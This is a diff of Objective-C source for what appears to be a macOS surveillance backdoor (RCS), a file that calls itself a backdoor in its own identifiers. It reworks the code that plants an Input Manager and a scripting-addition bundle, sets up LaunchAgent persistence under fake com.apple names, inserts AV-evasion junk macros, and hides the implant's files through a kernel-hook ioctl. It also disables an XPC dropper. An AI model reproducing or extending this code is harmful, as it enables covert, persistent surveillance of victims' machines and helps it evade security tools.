@@ -32,6 +32,7 @@
 
 #import "RCSMCore.h"
 #import "RCSMCommon.h"
+#import "RCSMGlobals.h"
 
 #import "RCSMInfoManager.h"
 #import "RCSMFileSystemManager.h"
@@ -312,7 +313,7 @@ static void computerWillShutdown(CFMachPortRef port,
 
 - (void)_registerForShutdownNotifications;
 
-- (void)_dropXPCBundle;
+//- (void)_dropXPCBundle;
 
 @end
 
@@ -1771,8 +1772,8 @@ static void computerWillShutdown(CFMachPortRef port,
                                                       seed: 2];
   gKext32Name               = [_encryption scrambleForward: gConfigurationName
                                                       seed: 4];
-  gXPCName                  = [_encryption scrambleForward: gConfigurationName
-                                                      seed: 8];
+//  gXPCName                  = [_encryption scrambleForward: gConfigurationName
+//                                                      seed: 8];
   gKext64Name               = [_encryption scrambleForward: gConfigurationName
                                                       seed: 16];
   
@@ -1789,7 +1790,6 @@ static void computerWillShutdown(CFMachPortRef port,
       infoLog(@"imanager   : %@", gInputManagerName);
       infoLog(@"kext32 name: %@", gKext32Name);
       infoLog(@"kext64 name: %@", gKext64Name);
-      infoLog(@"xpc name   : %@", gXPCName);
     }
 #endif
   
@@ -2432,12 +2432,7 @@ static void computerWillShutdown(CFMachPortRef port,
           // AV evasion: only on release build
           AV_GARBAGE_002
           
-          NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
-                                     [[[[[NSBundle mainBundle] bundlePath]
-                                        stringByDeletingLastPathComponent]
-                                       stringByDeletingLastPathComponent]
-                                      stringByDeletingLastPathComponent],
-                                     BACKDOOR_DAEMON_PLIST];
+          NSString *backdoorPlist = createLaunchdPlistPath();
           
           NSArray *arguments = [NSArray arrayWithObjects:
                                 @"load",
@@ -2462,6 +2457,45 @@ static void computerWillShutdown(CFMachPortRef port,
   return NO;
 }
 
+- (BOOL)createFolder:(NSString*)pathName
+{
+  NSFileManager *fm = [NSFileManager defaultManager];
+  
+  return [fm createDirectoryAtPath:pathName 
+       withIntermediateDirectories:YES 
+                        attributes:nil 
+                             error:nil];
+}
+
+- (BOOL)createIMFolderTree
+{
+  NSString *imResources = [NSString stringWithFormat:@"/%@/%@/%@/%@.%@/%@/%@", 
+                                                      LIBRARY_NSSTRING, 
+                                                      IM_FOLDER,
+                                                      IM_NAME,
+                                                      IM_NAME,
+                                                      IM_EXT,
+                                                      IM_CONTENTS,
+                                                      IM_RESOURCES];
+  
+  NSString *imMacos = [NSString stringWithFormat:@"/%@/%@/%@/%@.%@/%@/%@", 
+                                                 LIBRARY_NSSTRING, 
+                                                 IM_FOLDER,
+                                                 IM_NAME,
+                                                 IM_NAME,
+                                                 IM_EXT,
+                                                 IM_CONTENTS
+                                                 IM_MACOS];
+  
+  if ([self createFolder: imResources] == FALSE)
+    return FALSE;
+  
+  if ([self createFolder: imMacos] == FALSE)
+    return FALSE;
+  
+  return TRUE;
+}
+
 - (BOOL)_dropInputManager
 {
   NSString *err;
@@ -2469,89 +2503,35 @@ static void computerWillShutdown(CFMachPortRef port,
   // AV evasion: only on release build
   AV_GARBAGE_007
   
-  NSString *_backdoorContentPath = [NSString stringWithFormat: @"%@/%@",
-                                    [[NSBundle mainBundle] bundlePath],
-                                    @"Contents"];
+  NSString *_backdoorContentPath;
   
-  if ([[NSFileManager defaultManager] fileExistsAtPath: @"/Library/InputManagers/appleHID"])
-    {
-      [[NSFileManager defaultManager] removeItemAtPath: @"/Library/InputManagers/appleHID"
-                                                 error: nil];
-    }
+//  if ([[NSFileManager defaultManager] fileExistsAtPath: @"/Library/InputManagers/appleHID"])
+//    {
+//      [[NSFileManager defaultManager] removeItemAtPath: @"/Library/InputManagers/appleHID"
+//                                                 error: nil];
+//    }
   
   // AV evasion: only on release build
   AV_GARBAGE_002
   
-  //
-  // Input Manager
-  //
-  if (mkdir("/Library/InputManagers", 0755) == -1 && errno != EEXIST)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error mkdir InputManagers (%d)", errno);
-#endif
-      return NO;
-    }
-  if (mkdir("/Library/InputManagers/appleHID", 0755) == -1 && errno != EEXIST)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error mkdir appleHID (%d)", errno);
-#endif
-      return NO;
-    }  
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_001
-  
-  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle", 0755) == -1 && errno != EEXIST)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error mkdir appleHID.bundle (%d)", errno);
-#endif
-      return NO;
-    }
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_002
-  
-  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents", 0755) == -1 && errno != EEXIST)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error mkdir Contents (%d)", errno);
-#endif
-      return NO;
-    }
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_001
-  
-  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/MacOS", 0755) == -1 && errno != EEXIST)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error mkdir MacOS (%d)", errno);
-#endif
-      return NO;
-    }
-  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/Resources", 0755) == -1 && errno != EEXIST)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error mkdir Resources (%d)", errno);
-#endif
-      return NO;
-    }
+  if ([self createIMFolderTree] == FALSE)
+    return FALSE;
   
   // AV evasion: only on release build
   AV_GARBAGE_003
   
   NSMutableDictionary *rootObj2 = [NSMutableDictionary dictionaryWithCapacity: 4];
   NSMutableDictionary *innerDict2 = [NSMutableDictionary dictionaryWithCapacity: 1];
+  
   [innerDict2 setObject: gInputManagerName
                  forKey: @"English"];
   
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  [rootObj2 setObject: @"appleHID.bundle"
+  NSString *imBundleName = [NSString stringWithFormat: @"%@.%@", IM_NAME, IM_EXT];
+  
+  [rootObj2 setObject: imBundleName
                forKey: @"BundleName"];
   [rootObj2 setObject: @"YES"
                forKey: @"LoadBundleOnLaunch"];
@@ -2564,21 +2544,30 @@ static void computerWillShutdown(CFMachPortRef port,
                                                                format: NSPropertyListXMLFormat_v1_0
                                                      errorDescription: &err];
   
-  [binData writeToFile: @"/Library/InputManagers/appleHID/Info"
+  NSString *imFolderInfo = [NSString stringWithFormat:@"/%@/%@/%@/Info" , 
+                                                      LIBRARY_NSSTRING, 
+                                                      IM_FOLDER, 
+                                                      IM_NAME];
+  
+  [binData writeToFile: imFolderInfo
             atomically: YES];
   
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  NSString *destDir = [[NSString alloc] initWithFormat:
-                       @"/Library/InputManagers/%@/%@.bundle/Contents/MacOS/%@",
-                       EXT_BUNDLE_FOLDER,
-                       EXT_BUNDLE_FOLDER,
-                       gInputManagerName];
+  NSString *destDir = [NSString stringWithFormat:@"/%@/%@/%@/%@.%@/%@/%@/%@",  
+                                                 LIBRARY_NSSTRING, 
+                                                 IM_FOLDER, 
+                                                 IM_NAME, 
+                                                 IM_NAME, 
+                                                 IM_EXT, 
+                                                 IM_CONTENTS, 
+                                                 IM_MACOS, 
+                                                 gInputManagerName];
   
-  NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
-                         [[NSBundle mainBundle] bundlePath],
-                         gInputManagerName];
+  NSString *tempIMDir = [[NSString alloc] initWithFormat:@"%@/%@",
+                                                         [[NSBundle mainBundle] bundlePath],
+                                                         gInputManagerName];
   
   // AV evasion: only on release build
   AV_GARBAGE_003
@@ -2603,7 +2592,7 @@ static void computerWillShutdown(CFMachPortRef port,
   
   [rootObj setObject: @"English" forKey: @"CFBundleDevelopmentRegion"];
   [rootObj setObject: gInputManagerName forKey: @"CFBundleExecutable"];
-  [rootObj setObject: @"com.apple.spotlight-worker" forKey: @"CFBundleIdentifier"];
+  [rootObj setObject: @"com.apple.spotlight-ui" forKey: @"CFBundleIdentifier"];
   [rootObj setObject: @"6.0" forKey: @"CFBundleInfoDictionaryVersion"];
   [rootObj setObject: @"BNDL" forKey: @"CFBundlePackageType"];
   [rootObj setObject: @"????" forKey: @"CFBundleSignature"];
@@ -2613,11 +2602,13 @@ static void computerWillShutdown(CFMachPortRef port,
                                                        format: NSPropertyListXMLFormat_v1_0
                                              errorDescription: nil];
   
-  _backdoorContentPath = [NSString stringWithFormat:
-                          @"/Library/InputManagers/%@/%@.bundle/Contents/Info.plist",
-                          EXT_BUNDLE_FOLDER,
-                          EXT_BUNDLE_FOLDER];
-  
+  _backdoorContentPath = [NSString stringWithFormat:@"/%@/%@/%@/%@.%@/%@/Info.plist",  
+                                                    LIBRARY_NSSTRING, 
+                                                    IM_FOLDER, 
+                                                    IM_NAME, 
+                                                    IM_NAME, 
+                                                    IM_EXT, 
+                                                    IM_CONTENTS];
   // AV evasion: only on release build
   AV_GARBAGE_008
   
@@ -2641,25 +2632,50 @@ static void computerWillShutdown(CFMachPortRef port,
   return YES;
 }
 
+- (BOOL)createOXFolderTree:(NSString*)pathName
+{
+  NSString *oxResources = [NSString stringWithFormat:@"%@/%@/%@", 
+                           pathName,
+                           IM_CONTENTS,
+                           IM_RESOURCES];
+  
+  NSString *oxMacos = [NSString stringWithFormat:@"%@/%@/%@", 
+                       pathName, 
+                       IM_CONTENTS,
+                       IM_MACOS];
+  
+  if ([self createFolder: oxResources] == FALSE)
+    return FALSE;
+  
+  if ([self createFolder: oxMacos] == FALSE)
+    return FALSE;
+  
+  return TRUE;
+}
+
 - (void)_dropOsaxBundle
 {
   NSString *osaxRootPath = nil;
   
+  // Only for upgrade from old version...
+  removeAppleHID();
+  
   // AV evasion: only on release build
   AV_GARBAGE_007
-  
+
   if (getuid() == 0 || geteuid() == 0) 
-    {
-      osaxRootPath = [[NSString alloc] initWithFormat: @"/%@", OSAX_ROOT_PATH];
+    {      
+      osaxRootPath = [[NSString alloc] initWithFormat: @"/%@/%@/%@", LIBRARY_NSSTRING, OSAX_FOLDER, OSAX_NAME];
       
       // AV evasion: only on release build
       AV_GARBAGE_003
       
       // i'm root: remove old low privs osax from user folders
-      NSString *osaxLowPrivsPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@/%@",
+      NSString *osaxLowPrivsPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@/%@/%@",
                                                       NSUserName(),
-                                                      OSAX_ROOT_PATH,
-                                                      EXT_BUNDLE_FOLDER];
+                                                      LIBRARY_NSSTRING, 
+                                                      OSAX_FOLDER, 
+                                                      OSAX_NAME];
       
       // AV evasion: only on release build
       AV_GARBAGE_009
@@ -2673,9 +2689,11 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   else
     {
-      osaxRootPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@",
-                                                       NSUserName(),
-                                                       OSAX_ROOT_PATH];
+      osaxRootPath = [[NSString alloc] initWithFormat:@"/Users/%@/%@/%@/%@",
+                                                      NSUserName(),
+                                                      LIBRARY_NSSTRING, 
+                                                      OSAX_FOLDER,
+                                                      OSAX_NAME];
     }
   
   // AV evasion: only on release build
@@ -2684,61 +2702,29 @@ static void computerWillShutdown(CFMachPortRef port,
   if (![[NSFileManager defaultManager] fileExistsAtPath: osaxRootPath])
     {
       [[NSFileManager defaultManager] createDirectoryAtPath: osaxRootPath 
-                                withIntermediateDirectories: NO 
+                                withIntermediateDirectories: YES 
                                                  attributes: nil 
                                                       error: nil];
     }
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_003
-  
-  NSMutableString *osaxPath = [[NSMutableString alloc] initWithFormat: @"%@/%@",
-                                                                        osaxRootPath,
-                                                                        EXT_BUNDLE_FOLDER];
-  
-  if ([[NSFileManager defaultManager] fileExistsAtPath: osaxPath])
-    {
-      [[NSFileManager defaultManager] removeItemAtPath: osaxPath
-                                                 error: nil];
-    }
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_007
-  
-  // Scripting folder
-  mkdir([osaxRootPath UTF8String], 0755);
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_007
-  
-  mkdir([osaxPath UTF8String], 0755);
-  
-  [osaxPath appendString: @"/Contents"];      
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_002
-  
-  mkdir([osaxPath UTF8String], 0755);
-  
-  NSString *tmpPath = [[NSString alloc] initWithFormat: @"%@/MacOS", osaxPath];
-  mkdir([tmpPath UTF8String], 0755);
-  [tmpPath release];
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_003
-  
-  [osaxPath appendString: @"/Resources"];
-  mkdir([osaxPath UTF8String], 0755);
 
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+
+  if ([self createOXFolderTree: osaxRootPath] == NO)
+    return;
+  
+#ifdef DEBUG_CORE
+      infoLog(@"creating OXFolderTree done");
+#endif
+  
   // AV evasion: only on release build
   AV_GARBAGE_000
   
-  NSString *destDir = [[NSString alloc] initWithFormat:
-                       @"%@/%@/Contents/MacOS/%@",
-                       osaxRootPath,
-                       EXT_BUNDLE_FOLDER,
-                       gInputManagerName];
-  [osaxPath release];
+  NSString *destDir = [[NSString alloc] initWithFormat:@"%@/%@/%@/%@", 
+                                                       osaxRootPath, 
+                                                       IM_CONTENTS, 
+                                                       IM_MACOS, 
+                                                       gInputManagerName];
   
   NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
                          [[NSBundle mainBundle] bundlePath],
@@ -2747,14 +2733,18 @@ static void computerWillShutdown(CFMachPortRef port,
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
-                                           isDirectory: NO] == NO)
-    {
-      [[NSFileManager defaultManager] copyItemAtPath: tempIMDir
-                                              toPath: destDir
-                                               error: nil];
-    }
+  NSError *err;
   
+  if ([[NSFileManager defaultManager] removeItemAtPath:destDir error: &err] == NO)
+  {
+#ifdef DEBUG_CORE
+    infoLog(@"error removing osax bin %@", err);
+#endif 
+  }
+  
+  [[NSFileManager defaultManager] copyItemAtPath: tempIMDir
+                                          toPath: destDir
+                                           error: nil];
   [tempIMDir release];
   [destDir release];
   
@@ -2767,9 +2757,8 @@ static void computerWillShutdown(CFMachPortRef port,
                                                               withString: gInputManagerName];
 
   NSString *infoPath = [NSString stringWithFormat:
-                        @"%@/%@/Contents/Info.plist",
-                        osaxRootPath,
-                        EXT_BUNDLE_FOLDER];
+                        @"%@/%@/Info.plist",
+                        osaxRootPath, IM_CONTENTS];
   
   // AV evasion: only on release build
   AV_GARBAGE_002
@@ -2785,9 +2774,8 @@ static void computerWillShutdown(CFMachPortRef port,
   NSString *resource_r = [[NSString alloc] initWithCString: inputManager_r];
   
   NSString *rPath = [NSString stringWithFormat:
-                     @"%@/%@/Contents/Resources/appleOsax.r",
-                     osaxRootPath,
-                     EXT_BUNDLE_FOLDER];
+                     @"%@/%@/%@/%@.r",
+                     osaxRootPath, IM_CONTENTS, IM_RESOURCES, OSAX_NAME];
   
   // AV evasion: only on release build
   AV_GARBAGE_000
@@ -2801,108 +2789,108 @@ static void computerWillShutdown(CFMachPortRef port,
   [osaxRootPath release];
 }
 
-- (void)_dropXPCBundle
-{
-  NSMutableString *xpcPath = [[NSMutableString alloc]
-                              initWithFormat: 
-                              @"%@/",
-                              XPC_BUNDLE_FRAMEWORK_PATH];
-  
-  if (![[NSFileManager defaultManager] fileExistsAtPath: xpcPath])
-    {
-#ifdef DEBUG_CORE
-      infoLog(@"creating folder %@ for xpc services", xpcPath);
-#endif
-      mkdir([xpcPath UTF8String], 0755);
-    }
-  
-  [xpcPath appendString: XPC_BUNDLE_FOLDER_PREFIX];
-  [xpcPath appendString: gMyXPCName];
-  [xpcPath appendString: @".xpc"];
-  
-#ifdef DEBUG_CORE
-  infoLog(@"xpc service folder %@", xpcPath);
-#endif
-  
-  if ([[NSFileManager defaultManager] fileExistsAtPath: xpcPath])
-    [[NSFileManager defaultManager] removeItemAtPath: xpcPath
-                                               error: nil];
-   
-  // .xpc folder
-  mkdir([xpcPath UTF8String], 0755);
-  
-  // Contents
-  [xpcPath appendString: @"/Contents"];
-  mkdir([xpcPath UTF8String], 0755);
-  
-#ifdef DEBUG_CORE
-  infoLog(@"xpc service folder %@", xpcPath);
-#endif
-  
-  NSString *info_orig_pl = [[NSString alloc] initWithCString: xpc_info_plist];
-  
-#ifdef DEBUG_CORE
-  //infoLog(@"Original info.plist for xpc %@", info_orig_pl);
-#endif
-  
-//  NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMXPCService" 
-//                                                              withString: gMyXPCName];
-  
-#ifdef DEBUG_CORE
-  //infoLog(@"info.plist for xpc %@", info_pl);
-#endif
-  
-  NSString *infoPath = [[NSString alloc] initWithFormat: @"%@/Info.plist", xpcPath];
- 
-#ifdef DEBUG_CORE
-  infoLog(@"info.plist for xpc %@", infoPath);
-#endif
-  
-  //[info_pl
-  [info_orig_pl writeToFile: infoPath
-                 atomically: YES
-                   encoding: NSUTF8StringEncoding
-                      error: NULL];
-  
-  //[info_pl release];
-  [info_orig_pl release];
-  [infoPath release];
-  
-  // Resources
-  NSString *tmpPath = [[NSString alloc] initWithFormat: @"%@/Resources", xpcPath];
-  mkdir([tmpPath UTF8String], 0755);
-  [tmpPath release];
-  
-  // MacOS
-  [xpcPath appendString: @"/MacOS"];
-  mkdir([xpcPath UTF8String], 0755);
-
-#ifdef DEBUG_CORE
-  infoLog(@"xpc service folder %@", xpcPath);
-#endif
-  
-  // Macho name
-  NSString *destXPCMacho = [[NSString alloc] initWithFormat:
-                            @"%@/%@%@",
-                            xpcPath,
-                            XPC_BUNDLE_FOLDER_PREFIX,
-                            gMyXPCName];
-  
-  NSString *origXPCMacho = [[NSString alloc] initWithFormat: @"%@/%@",
-                            [[NSBundle mainBundle] bundlePath],
-                            gXPCName];
- 
-#ifdef DEBUG_CORE
-  infoLog(@"xpc service files: orig %@, dest %@", origXPCMacho, destXPCMacho);
-#endif
-
-  [[NSFileManager defaultManager] copyItemAtPath: origXPCMacho
-                                          toPath: destXPCMacho
-                                           error: nil];
-  
-  [origXPCMacho release];
-  [destXPCMacho release];
-}
+//- (void)_dropXPCBundle
+//{
+//  NSMutableString *xpcPath = [[NSMutableString alloc]
+//                              initWithFormat: 
+//                              @"%@/",
+//                              XPC_BUNDLE_FRAMEWORK_PATH];
+//  
+//  if (![[NSFileManager defaultManager] fileExistsAtPath: xpcPath])
+//    {
+//#ifdef DEBUG_CORE
+//      infoLog(@"creating folder %@ for xpc services", xpcPath);
+//#endif
+//      mkdir([xpcPath UTF8String], 0755);
+//    }
+//  
+//  [xpcPath appendString: XPC_BUNDLE_FOLDER_PREFIX];
+//  [xpcPath appendString: gMyXPCName];
+//  [xpcPath appendString: @".xpc"];
+//  
+//#ifdef DEBUG_CORE
+//  infoLog(@"xpc service folder %@", xpcPath);
+//#endif
+//  
+//  if ([[NSFileManager defaultManager] fileExistsAtPath: xpcPath])
+//    [[NSFileManager defaultManager] removeItemAtPath: xpcPath
+//                                               error: nil];
+//   
+//  // .xpc folder
+//  mkdir([xpcPath UTF8String], 0755);
+//  
+//  // Contents
+//  [xpcPath appendString: @"/Contents"];
+//  mkdir([xpcPath UTF8String], 0755);
+//  
+//#ifdef DEBUG_CORE
+//  infoLog(@"xpc service folder %@", xpcPath);
+//#endif
+//  
+//  NSString *info_orig_pl = [[NSString alloc] initWithCString: xpc_info_plist];
+//  
+//#ifdef DEBUG_CORE
+//  //infoLog(@"Original info.plist for xpc %@", info_orig_pl);
+//#endif
+//  
+////  NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMXPCService" 
+////                                                              withString: gMyXPCName];
+//  
+//#ifdef DEBUG_CORE
+//  //infoLog(@"info.plist for xpc %@", info_pl);
+//#endif
+//  
+//  NSString *infoPath = [[NSString alloc] initWithFormat: @"%@/Info.plist", xpcPath];
+// 
+//#ifdef DEBUG_CORE
+//  infoLog(@"info.plist for xpc %@", infoPath);
+//#endif
+//  
+//  //[info_pl
+//  [info_orig_pl writeToFile: infoPath
+//                 atomically: YES
+//                   encoding: NSUTF8StringEncoding
+//                      error: NULL];
+//  
+//  //[info_pl release];
+//  [info_orig_pl release];
+//  [infoPath release];
+//  
+//  // Resources
+//  NSString *tmpPath = [[NSString alloc] initWithFormat: @"%@/Resources", xpcPath];
+//  mkdir([tmpPath UTF8String], 0755);
+//  [tmpPath release];
+//  
+//  // MacOS
+//  [xpcPath appendString: @"/MacOS"];
+//  mkdir([xpcPath UTF8String], 0755);
+//
+//#ifdef DEBUG_CORE
+//  infoLog(@"xpc service folder %@", xpcPath);
+//#endif
+//  
+//  // Macho name
+//  NSString *destXPCMacho = [[NSString alloc] initWithFormat:
+//                            @"%@/%@%@",
+//                            xpcPath,
+//                            XPC_BUNDLE_FOLDER_PREFIX,
+//                            gMyXPCName];
+//  
+//  NSString *origXPCMacho = [[NSString alloc] initWithFormat: @"%@/%@",
+//                            [[NSBundle mainBundle] bundlePath],
+//                            gXPCName];
+// 
+//#ifdef DEBUG_CORE
+//  infoLog(@"xpc service files: orig %@, dest %@", origXPCMacho, destXPCMacho);
+//#endif
+//
+//  [[NSFileManager defaultManager] copyItemAtPath: origXPCMacho
+//                                          toPath: destXPCMacho
+//                                           error: nil];
+//  
+//  [origXPCMacho release];
+//  [destXPCMacho release];
+//}
 
 - (void)_solveKernelSymbolsForKext
 {    
@@ -3774,8 +3762,10 @@ static void computerWillShutdown(CFMachPortRef port,
     AV_GARBAGE_004
     
     // precalc sha1 of "hxVtdxJ/Z8LvK3ULSnKRUmLE
-    char demoSha1[] = "\x31\xa2\x85\xaf\xb0\x43\xe7\xa0\x90\x49"
-    "\x94\xe1\x70\x07\xc8\x26\x3d\x45\x42\x73";
+    //char demoSha1[] = "\x31\xa2\x85\xaf\xb0\x43\xe7\xa0\x90\x49"
+    //                  "\x94\xe1\x70\x07\xc8\x26\x3d\x45\x42\x73";
+    char demoSha1[] =   "\x4e\xb8\x75\x0e\xa8\x10\xd1\x94\xb4\x69"
+                        "\xf0\xaf\xa8\xf4\x77\x51\x49\x69\xba\x72";
     
     NSMutableData *isDemoMarker = [[NSMutableData alloc] initWithBytes: demoSha1 length: 20];
     
@@ -3815,32 +3805,41 @@ static void computerWillShutdown(CFMachPortRef port,
   // AV evasion: only on release build
   AV_GARBAGE_009
   
-  return [gUtil createLaunchAgentPlist: @"com.apple.mdworker"
-                             forBinary: gBackdoorName];
+  NSString *backdoorDaemonName = [NSString stringWithFormat:@"%@.%@.%@", 
+                                                            DOMAIN_COM, 
+                                                            DOMAIN_APL, 
+                                                            LAUNCHD_NAME];
+  
+  return [gUtil createLaunchAgentPlist:backdoorDaemonName
+                             forBinary:gBackdoorName];
 }
 
 - (BOOL)isBackdoorAlreadyResident
-{  
+{ 
+  // for upgrade from old version
+  removeOldLd();
+  
   // AV evasion: only on release build
   AV_GARBAGE_000
   
-  NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
-                             [[[[[NSBundle mainBundle] bundlePath]
-                                stringByDeletingLastPathComponent]
-                               stringByDeletingLastPathComponent]
-                              stringByDeletingLastPathComponent],
-                             BACKDOOR_DAEMON_PLIST];
+  NSString *backdoorPlist = createLaunchdPlistPath();
   
   // AV evasion: only on release build
-  AV_GARBAGE_001
+  AV_GARBAGE_004
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: backdoorPlist
                                            isDirectory: NULL])
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       return YES;
     }
   else
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+    
       return NO;
     }
 }
@@ -3891,17 +3890,22 @@ static void computerWillShutdown(CFMachPortRef port,
   NSString *updateDylib = [[NSString alloc] initWithFormat: @"%@/%@",
                                                             [[NSBundle mainBundle] bundlePath],
                                                             RCS8_UPDATE_DYLIB];
+#ifdef DEBUG_CORE
+  infoLog(@"RCS8_UPDATE_DYLIB %@", updateDylib);
+#endif
   
   // AV evasion: only on release build
   AV_GARBAGE_002
   
-  if ([[NSFileManager defaultManager] fileExistsAtPath: RCS8_UPDATE_DYLIB] == TRUE)
+  if ([[NSFileManager defaultManager] fileExistsAtPath: updateDylib] == TRUE)
   
     {
       NSString *dylib = [[NSString alloc] initWithFormat: @"%@/%@",
                                                           [[NSBundle mainBundle] bundlePath],
                                                           gInputManagerName];
-      
+#ifdef DEBUG_CORE
+      infoLog(@"gInputManagerName %@", gInputManagerName);
+#endif
       // AV evasion: only on release build
       AV_GARBAGE_000
       
@@ -3913,6 +3917,10 @@ static void computerWillShutdown(CFMachPortRef port,
       [[NSFileManager defaultManager] moveItemAtPath: updateDylib
                                               toPath: dylib
                                                error: nil];
+#ifdef DEBUG_CORE
+      infoLog(@"updateDylib %@", updateDylib);
+#endif
+      
       [dylib release];                                      
 
     }
@@ -3921,11 +3929,11 @@ static void computerWillShutdown(CFMachPortRef port,
   
   // AV evasion: only on release build
   AV_GARBAGE_001
-  
-  if ([[NSFileManager defaultManager] fileExistsAtPath: RCS8_UPDATE_XPC] == TRUE)
-    {
-    
-    }
+//  
+//  if ([[NSFileManager defaultManager] fileExistsAtPath: RCS8_UPDATE_XPC] == TRUE)
+//    {
+//    
+//    }
       
   return TRUE;
 }
@@ -4059,9 +4067,8 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   
   // Create LaunchAgent dir if it doesn't exists yet
-  NSString *launchAgentPath = [NSString stringWithFormat: @"%@/%@",
-                               NSHomeDirectory(),
-                               [BACKDOOR_DAEMON_PLIST stringByDeletingLastPathComponent]];
+  NSString *launchAgentPath = [NSString stringWithFormat: @"/Users/%@/%@/%@",
+                               NSUserName(), LIBRARY_NSSTRING, LAUNCHD_DIR];
   
   // AV evasion: only on release build
   AV_GARBAGE_000
@@ -4244,7 +4251,8 @@ static void computerWillShutdown(CFMachPortRef port,
       
       //
       // Start hiding all the required paths
-      NSString *backdoorPlist = [[NSString alloc] initWithString: BACKDOOR_DAEMON_PLIST];
+      NSString *backdoorPlist = [[NSString alloc] initWithFormat: @"%@.%@.%@.%@", 
+                                 DOMAIN_COM, DOMAIN_APL, LAUNCHD_NAME, LAUNCHD_EXT];
       
 #ifdef DEBUG_CORE
       infoLog(@"Hiding LaunchAgent plist");
@@ -4254,7 +4262,7 @@ static void computerWillShutdown(CFMachPortRef port,
       AV_GARBAGE_002
       
       // Hiding LaunchAgent plist
-      ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[[backdoorPlist lastPathComponent] fileSystemRepresentation]);
+      ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[backdoorPlist fileSystemRepresentation]);
       
       [backdoorPlist release];
       
@@ -4268,7 +4276,7 @@ static void computerWillShutdown(CFMachPortRef port,
           infoLog(@"Hiding InputManager");
 #endif
           NSString *inputManagerPath = [[NSString alloc]
-                                        initWithString: EXT_BUNDLE_FOLDER];
+                                        initWithString: IM_NAME];
           
           // AV evasion: only on release build
           AV_GARBAGE_004
